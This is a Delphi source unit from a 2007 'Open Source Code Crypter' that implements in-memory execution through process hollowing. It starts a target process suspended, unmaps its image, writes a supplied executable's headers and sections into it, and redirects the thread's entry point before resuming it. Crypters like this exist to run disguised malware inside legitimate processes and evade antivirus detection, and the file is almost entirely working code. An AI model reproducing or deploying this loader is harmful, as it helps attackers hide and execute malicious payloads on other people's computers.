(*****************************************

        Open Source Code Crypter
         (c) p0ke 9th June 2007


     File-size without KOL : 21,5 KB
        File-size with KOL : 14,0 KB


   This file contains code for memory
   execution. This code was originally
   written by -redlime & nico.

   I have not modified alot, so big
   credits to them.

*****************************************)

unit unitMemoryExecute;

interface

uses
  Windows;

type
  HANDLE        = THandle;
  PVOID         = Pointer;
  LPVOID        = Pointer;
  SIZE_T        = Cardinal;
  ULONG_PTR     = Cardinal;
  NTSTATUS      = LongInt;
  LONG_PTR      = Integer;

  PImageSectionHeaders = ^TImageSectionHeaders;
  TImageSectionHeaders = Array [0..95] Of TImageSectionHeader;

  (*****************************************
   VirtualAllocEx, VirtualProtectEx,
   ZwUnmapViewOfSection - These three apis
   are loaded external. You could use
   LoadLibray and GetProcAddress to load them.
   ****************************************)

  Function VirtualAllocEx       (hProcess: HANDLE; lpAddress: LPVOID; dwSize: SIZE_T; flAllocationType: DWORD; flProtect: DWORD): LPVOID; stdcall; external 'kernel32.dll' name 'VirtualAllocEx';
  //Function VirtualProtectEx     (hProcess: HANDLE; lpAddress: LPVOID; dwSize: SIZE_T; flNewProtect: DWORD; var lpflOldProtect: DWORD): BOOL; stdcall; external 'kernel32.dll' name 'VirtualProtectEx';
  Function ZwUnmapViewOfSection (ProcessHandle: HANDLE; BaseAddress: PVOID): NTSTATUS; stdcall; external 'ntdll.dll' name 'ZwUnmapViewOfSection';
  Function ImageFirstSection    (NTHeader: PImageNTHeaders): PImageSectionHeader;
  Function MemoryExecute        (Buffer: Pointer; ProcessName, Parameters: String; Visible: Boolean): Boolean;

implementation

Function ImageFirstSection(NTHeader: PImageNTHeaders): PImageSectionHeader;
Begin
  Result := PImageSectionheader( ULONG_PTR(@NTheader.OptionalHeader) +
                                 NTHeader.FileHeader.SizeOfOptionalHeader);
End;

Function Protect(Characteristics: ULONG): ULONG;
Const
  Mapping       :Array[0..7] Of ULONG = (
                 PAGE_NOACCESS,
                 PAGE_EXECUTE,
                 PAGE_READONLY,
                 PAGE_EXECUTE_READ,
                 PAGE_READWRITE,
                 PAGE_EXECUTE_READWRITE,
                 PAGE_READWRITE,
                 PAGE_EXECUTE_READWRITE  );
Begin
  Result := Mapping[ Characteristics SHR 29 ];
End;

(*****************************************
 MemoryExecute() Function

 Loads a choosen application into the
 memory of another application, with
 or without choosen parameters. Can
 also load file visible.
 ****************************************)
Function MemoryExecute(Buffer: Pointer; ProcessName, Parameters: String; Visible: Boolean): Boolean;
Var
  ProcessInfo           :TProcessInformation;
  StartupInfo           :TStartupInfo;
  Context               :TContext;
  BaseAddress           :Pointer;
  BytesRead             :DWORD;
  BytesWritten          :DWORD;
  I                     :ULONG;
  OldProtect            :ULONG;
  NTHeaders             :PImageNTHeaders;
  Sections              :PImageSectionHeaders;
  Success               :Boolean;
Begin
  Result := False;

  FillChar(ProcessInfo, SizeOf(TProcessInformation), 0);
  FillChar(StartupInfo, SizeOf(TStartupInfo),        0);

  StartupInfo.cb := SizeOf(TStartupInfo);
  StartupInfo.wShowWindow := Word(Visible);

  If (CreateProcess(PChar(ProcessName), PChar(Parameters), NIL, NIL,
                    False, CREATE_SUSPENDED, NIL, NIL, StartupInfo, ProcessInfo)) Then
  Begin
    Success := True;

    Try
      Context.ContextFlags := CONTEXT_INTEGER;
      If (GetThreadContext(ProcessInfo.hThread, Context) And
         (ReadProcessMemory(ProcessInfo.hProcess, Pointer(Context.Ebx + 8),
                            @BaseAddress, SizeOf(BaseAddress), BytesRead)) And
         (ZwUnmapViewOfSection(ProcessInfo.hProcess, BaseAddress) >= 0) And
         (Assigned(Buffer))) Then
         Begin
           NTHeaders    := PImageNTHeaders(Cardinal(Buffer) + Cardinal(PImageDosHeader(Buffer)._lfanew));
           BaseAddress  := VirtualAllocEx(ProcessInfo.hProcess,
                                          Pointer(NTHeaders.OptionalHeader.ImageBase),
                                          NTHeaders.OptionalHeader.SizeOfImage,
                                          MEM_RESERVE or MEM_COMMIT,
                                          PAGE_READWRITE);
           If (Assigned(BaseAddress)) And
              (WriteProcessMemory(ProcessInfo.hProcess, BaseAddress, Buffer,
                                  NTHeaders.OptionalHeader.SizeOfHeaders,
                                  BytesWritten)) Then
              Begin
                Sections := PImageSectionHeaders(ImageFirstSection(NTHeaders));

                For I := 0 To NTHeaders.FileHeader.NumberOfSections -1 Do
                  If (WriteProcessMemory(ProcessInfo.hProcess,
                                         Pointer(Cardinal(BaseAddress) +
                                                 Sections[I].VirtualAddress),
                                         Pointer(Cardinal(Buffer) +
                                                 Sections[I].PointerToRawData),
                                         Sections[I].SizeOfRawData, BytesWritten)) Then
                     VirtualProtectEx(ProcessInfo.hProcess,
                                      Pointer(Cardinal(BaseAddress) +
                                              Sections[I].VirtualAddress),
                                      Sections[I].Misc.VirtualSize,
                                      Protect(Sections[I].Characteristics),
                                      OldProtect);

                If (WriteProcessMemory(ProcessInfo.hProcess,
                                       Pointer(Context.Ebx + 8), @BaseAddress,
                                       SizeOf(BaseAddress), BytesWritten)) Then
                   Begin
                     Context.Eax := ULONG(BaseAddress) +
                                    NTHeaders.OptionalHeader.AddressOfEntryPoint;
                     Success := SetThreadContext(ProcessInfo.hThread, Context);
                   End;
              End;
         End;
    Finally
      If (Not Success) Then
        TerminateProcess(ProcessInfo.hProcess, 0)
      Else
        ResumeThread(ProcessInfo.hThread);
      while WaitForSingleObject(ProcessInfo.hProcess,100)<>0 do
        Sleep(100);
      Result := Success;
    End;
  End;
End;

end.

